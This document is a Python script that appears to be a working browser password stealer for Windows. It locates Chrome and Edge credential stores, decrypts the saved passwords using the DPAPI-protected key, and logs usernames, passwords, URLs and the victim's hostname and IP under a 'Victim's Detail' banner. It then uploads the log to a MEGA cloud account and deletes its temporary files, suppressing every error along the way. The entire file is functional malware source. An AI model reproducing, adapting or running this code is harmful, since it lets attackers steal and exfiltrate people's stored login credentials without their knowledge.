import os
from os import path, environ, chdir
from json import loads
from base64 import b64decode
from sqlite3 import connect
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from shutil import copyfile
from datetime import datetime, timedelta
import socket


def find_files(filename, search_path):
    global state, state1
    for root, _, files in os.walk(search_path):
        if filename in files:
            if search_path.endswith(chrome):
                if filename == "Login Data":
                    result.append(os.path.join(root, filename))

                elif filename == "Local State":
                    state = os.path.join(root, filename)

            elif search_path.endswith(microsoft):
                if search_path.endswith(microsoft):
                    if filename == "Login Data":
                        result1.append(os.path.join(root, filename))

                    elif filename == "Local State":
                        state1 = os.path.join(root, filename)


def get_encryption_key(rc_state):
    local_state_path = rc_state
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)

    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def main(data, rc_state):
    global count
    key = get_encryption_key(rc_state)
    db_path = data
    chdir(environ["temp"])
    filename = "database.db"
    copyfile(db_path, filename)
    db = connect(filename)
    cursor = db.cursor()
    sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
    cursor.execute(sql)
    for row in cursor.fetchall():

        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            count += 1
            display(count, origin_url, action_url, username, password, data, date_created, date_last_used)

        else:
            continue

    cursor.close()
    db.close()


def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    else:
        return "Can't Access"


def get_browser_name(find_name):
    for i in os.path.normpath(find_name).split(os.path.sep):
        if i == "Chrome":
            return "Google Chrome"
        if i == "Microsoft":
            return "Microsoft Edge"


def display(count, origin_url, actionurl, username, password, path_data, date_created, last_used):
    hostname = socket.gethostname()
    ip_add = socket.gethostbyname(hostname)

    p = f"Creation date: {str(get_chrome_datetime(date_created))}"
    pr = f"Last Used:     {str(get_chrome_datetime(last_used))}"
    name = get_browser_name(path_data)

    banner = fr"""

         _____ _____ _____  ___   _      ___________  ______        
        /  ___|_   _|  ___|/ _ \ | |    |  ___| ___ \ | ___ \       
        \ `--.  | | | |__ / /_\ \| |    | |__ | |_/ / | |_/ /_   _  
         `--. \ | | |  __||  _  || |    |  __||    /  | ___ \ | | | 
        /\__/ / | | | |___| | | || |____| |___| |\ \  | |_/ / |_| | 
        \____/  \_/ \____/\_| |_/\_____/\____/\_| \_| \____/ \__, | 
                                                              __/ | 
                                                             |___/  
         _   __      _        _    _   __           _         _     
        | | / /     | |      | |  | | / /          | |       | |    
        | |/ /  __ _| |_ __ _| | _| |/ /  ___ _ __ | |_ _   _| |_   
        |    \ / _` | __/ _` | |/ /    \ / _ \ '_ \| __| | | | __|  
        | |\  \ (_| | || (_| |   <| |\  \  __/ | | | |_| |_| | |_   
        \_| \_/\__,_|\__\__,_|_|\_\_| \_/\___|_| |_|\__|\__,_|\__|  

                            Victim's Detail :          
                   ___________________________________    

                     [~~] Hostname:    {hostname}
                     [~~] Ip Address:  {ip_add}    
                   ___________________________________  
    """
    dis = (rf""" 

            [{count}] Username & Password Found !! + 
            [*] Browser : {name}
            [*] Url : {origin_url}
            [*] Action Url : {actionurl}
            [*] Username : {username}
            [*] Password : {password}   
            [*] {p}
            [*] {pr}

             """)

    with open("pass.txt", mode="a", encoding="utf-8") as f:

        if count:
            if count == 1:
                f.writelines(banner)
            else:
                f.writelines(dis)


def send_mega(username, password):
    from mega import Mega
    mega = Mega()
    m = mega.login(username, password)
    m.upload(r"pass.txt")


def total():
    with open("pass.txt", mode="a", encoding="utf-8") as f:
        f.writelines(f"""   
                    {count} Saved Account Extracted:
                        -Google Chrome
                        -Microsoft Edge

    """)


if __name__ == '__main__':
    count = 0
    chrome = path.join(environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome")
    microsoft = path.join(environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge")
    result = []
    result1 = []
    state = ""
    state1 = ""

    try:
        find_files("Login Data", chrome)
        find_files("Local State", chrome)
        find_files("Login Data", microsoft)
        find_files("Local State", microsoft)
        dict_path = {}

        for i in result:
            dict_path[i] = state

        for k in result1:
            dict_path[k] = state1

        for key, value in dict_path.items():
            main(key, value)

        total()

        username = " username "
        password = " email "

        send_mega(username, password)
        os.remove("pass.txt")
        os.remove("database.db")

    except Exception as e:
        pass
